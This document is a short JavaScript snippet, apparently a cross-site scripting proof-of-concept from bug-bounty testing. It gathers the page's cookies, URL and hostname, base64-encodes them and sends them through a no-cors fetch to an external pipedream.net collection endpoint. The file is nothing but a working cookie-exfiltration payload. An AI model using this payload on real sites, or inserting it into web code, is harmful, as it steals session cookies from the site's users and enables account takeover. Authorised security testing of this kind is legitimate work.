(() => {
  const data = {
    sensitive: document.cookie,
    url: window.location.href,
    domain: window.location.hostname,
    timestamp: Date.now(),
    proof: "xss-callback-test"
  };

  const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(data))));

  fetch(`https://eolxijmljxeogue.m.pipedream.net/reaper/bbp-assesment/${b64}/${data.timestamp}`, {
    method: "GET",
    mode: "no-cors"
  });
})();
